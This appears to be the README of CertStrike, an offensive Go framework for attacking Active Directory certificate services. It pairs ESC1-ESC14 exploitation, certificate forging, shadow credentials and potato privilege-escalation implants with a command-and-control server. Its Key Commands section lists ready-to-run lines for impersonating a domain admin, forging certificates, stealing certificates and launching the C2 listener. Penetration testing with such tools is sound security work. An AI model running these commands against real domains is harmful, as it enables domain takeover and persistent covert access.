# CertStrike

## Overview
ADCS exploitation and PKI attack framework with integrated cert-auth C2. Pure Go, CGO-free.

## Architecture
- `cmd/certstrike/` — CLI entry points (cobra commands)
- `pkg/pki/` — ADCS enumeration, ESC1-14 exploitation, shadow credentials, certificate forging, reporting
- `pkg/c2/` — HTTP/HTTPS C2 listener, session management, cert-auth implants, polling agent
- `internal/mcp/` — MCP stdio server (5 tools)
- `internal/tui/` — Bubbletea operator console
- `implants/smartpotato/` — Windows potato privilege escalation (JuicyPotato, RoguePotato, SweetPotato)

## Build
```bash
CGO_ENABLED=0 go build ./...
cd implants/smartpotato && GOOS=windows GOARCH=amd64 go build -o smartpotato.exe
```

## Features

### PKI / ADCS
- ESC1-ESC5 detection + exploitation (ESC4 full ACE parsing)
- ESC8 HTTP web enrollment relay detection
- ESC9 CT_FLAG_NO_SECURITY_EXTENSION detection + UPN swap exploitation
- ESC10 weak certificate mapping detection
- ESC11 RPC interface encryption enforcement detection
- ESC13 OID group link abuse detection + exploitation
- ESC14 weak explicit mappings detection
- Shadow Credentials (msDS-KeyCredentialLink add/list/remove)
- Golden certificate forging (CA-key signed)
- Auto-pwn orchestration (enumerate → exploit → forge → PKINIT commands)
- Certificate theft playbook (THEFT1-THEFT5)
- PKINIT command generation (certipy, Rubeus, impacket)
- UnPAC-the-hash command generation

### C2 Framework
- HTTP/HTTPS listeners with auto-generated TLS certificates
- Session management (register, poll, command queue, result collection)
- Certificate persistence: cert-auth implants via forged certificates (Schannel mTLS)
- Polling agent: `certstrike agent --config stager.json`

### QoL
- LDAPS/StartTLS support
- JSON structured output (--json)
- PFX import/export
- Stealth mode (jittered LDAP queries)
- Engagement reporting (markdown format)
- MCP server (5 tools)
- TUI operator console

## Key Commands
```bash
certstrike pki --enum --target-dc dc01 --domain corp.local -u user -p pass
certstrike pki --exploit esc1 --template Vuln --upn admin@corp.local --target-dc dc01 --domain corp.local -u user -p pass
certstrike pki --exploit esc9 --template NoSecExt --upn admin@corp.local --attacker-dn "CN=..." --target-dc dc01 --domain corp.local -u user -p pass
certstrike pki --forge --upn admin@corp.local --ca-key ca.key --ca-cert ca.crt
certstrike pki --cert-theft all
certstrike pki --report --format markdown --output findings.md --target-dc dc01 --domain corp.local -u user -p pass
certstrike shadow --add --target "CN=victim,CN=Users,DC=corp,DC=local" --target-dc dc01 --domain corp.local -u user -p pass
certstrike auto --target-dc dc01 --domain corp.local --upn admin@corp.local -u user -p pass
certstrike auto --dry-run --target-dc dc01 --domain corp.local --upn admin@corp.local -u user -p pass
certstrike c2 --port 8443 --protocol https
certstrike agent --config stager.json
```

## Dependencies
- github.com/spf13/cobra — CLI framework
- github.com/go-ldap/ldap/v3 — Native LDAP client (pure Go)
- github.com/charmbracelet/bubbletea — TUI framework
- github.com/charmbracelet/lipgloss — TUI styling
- software.sslmate.com/src/go-pkcs12 — PKCS12/PFX handling
